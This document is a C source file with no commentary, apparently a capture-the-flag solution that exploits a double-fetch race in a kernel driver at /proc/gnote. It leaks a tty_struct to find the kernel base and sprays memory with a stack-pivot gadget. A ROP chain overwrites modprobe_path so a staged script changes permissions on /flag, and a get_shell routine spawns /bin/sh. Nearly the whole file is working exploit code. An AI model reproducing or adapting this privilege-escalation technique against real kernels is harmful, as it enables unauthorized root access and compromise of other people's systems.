#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <pthread.h>
#include <signal.h>
#include <syscall.h>

typedef struct _Request {
    uint32_t cmd;
    uint32_t value;
} Request;

Request req;

size_t user_cs, user_ss, user_rflags, user_sp;
uint32_t race_value = 0x8200000;

// for kernel mode to user mode
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;" // push the flag
            "pop user_rflags;"
            );
    puts("[*] Status has been saved.");
}

// https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/595250/
void* job() {
    // __asm__(asm template : output : input : break describe)
    __asm__("mov eax,%1;"
            "y: xchg eax,[%0];" // exchange with memory (req.cmd)
            "jmp y" // jmp to y label
            ::"r"(&req.cmd),"r"(race_value):"rax","memory"
            );
}

void prepare_files() {
    // fake file
    int fd = open("/tmp/fake", O_WRONLY | O_CREAT);
    write(fd, "\xff\xff\xff\xff", 4);
    close(fd);


    char *s = "#!/bin/bash\nchmod 777 /flag";
    fd = open("/tmp/x", O_WRONLY | O_CREAT);
    write(fd, s, strlen(s));
    close(fd);
}

void get_shell(int sig) {
    printf("[*] Get shell\n");
    system("/bin/sh");
}

int main()
{
	save_status();
    prepare_files();

    int pfd[0x100];
    
    for (int i = 0; i < 0x100; i++) {
        pfd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY); // tty_structure 0x2e0
    }

    for (int i = 0; i < 0x100; i++) {
        close(pfd[i]);
    }

    int fd = open("/proc/gnote", O_RDWR); // Read Write

    req.cmd = 1;
    req.value = 0x2e0; // get tty_structure
    write(fd, &req, sizeof(req));

    req.cmd = 5;
    req.value = 0;
    write(fd, &req, sizeof(req)); // select 0
    
    size_t buf[0x100] = {0}; // receive tty_struct data
    read(fd, buf, sizeof(buf));

    for (int i = 0; i < 0x100 / 8; i++) {
        printf("0x%x: %p\n", i*8, buf[i]);
    }
    size_t kernel_base = buf[3] - 0xa35360;

    printf("[*] kernel base: %p\n", kernel_base);

    // module base in noaslr: 0xffffffffc0000000
    // (0xffffffffc0000000 + 0x8200000*8) & (2**64-1) == 0x1000000
    // (0xffffffffc0ff0000 + 0x8200000*8) & (2**64-1) == 0x1ff0000
    // MAP_FIXED: must be there
    size_t *target = mmap((void *)0x1000000, 0x1000000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // 0x1000000 ~ 0x2000000
    size_t mov_esp_eax = kernel_base + 0x1204ca;
    
    printf("[*] Target area: %p\n", target);
    for (int i = 0; i < 0x1000000 / 8; i++) {
        target[i] = mov_esp_eax;
    }
    
    size_t *rsp = mov_esp_eax & 0xffffffff;
    printf("[*] gadget: %p\n", mov_esp_eax);
   
    printf("[*] rsp: %p\n", rsp);
    size_t *new_stack = mmap(((uint32_t) rsp & 0xfffff000) - 0x1000, 0x4000, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    printf("[*] new stack: %p\n", new_stack);
     
    int i = -1;
    size_t pop_rdi_ret = kernel_base + 0x1c20d;
    size_t mov_rdi_rax = kernel_base + 0x580579; // mov rdi, rax ; mov qword ptr [rdi], 1 ; pop rbp ; ret
	size_t jmp_rdi = kernel_base + 0x30442;
    size_t pop_rsi_ret = kernel_base + 0x37799;
    size_t mov_ptr_rdi_rsi = kernel_base + 0x19610c;

	size_t modprobe_path = kernel_base + 0xc2c540;
    size_t prepare_kernel_cred = kernel_base + 0x69fe0;
    size_t commit_creds = kernel_base + 0x69df0;
    size_t swapgs_restore_regs_and_return_to_usermode = kernel_base + 0x600a34;
    size_t kpti_ret = swapgs_restore_regs_and_return_to_usermode + 0x16; // not need pops
    
    // 3 for pop garbage
    rsp[++i] = 0x0;
    rsp[++i] = 0x0;
    rsp[++i] = 0x0;
    
    rsp[++i] = pop_rdi_ret;
    rsp[++i] = modprobe_path;
    rsp[++i] = pop_rsi_ret;
    rsp[++i] = 0x782f706d742f; // /tmp/x
    rsp[++i] = mov_ptr_rdi_rsi;
    
    // infinite loop
    rsp[++i] = pop_rdi_ret;
    rsp[++i] = jmp_rdi;
    rsp[++i] = jmp_rdi;

    // start racing
    // scanf("%*c"); // pause before race
    pthread_t tid;
    pthread_create(&tid, NULL, job, NULL);
    printf("[*] Racing...\n");

    req.cmd = 2;
    while (1) {
        write(fd, &req, sizeof(req));
    }
    
}

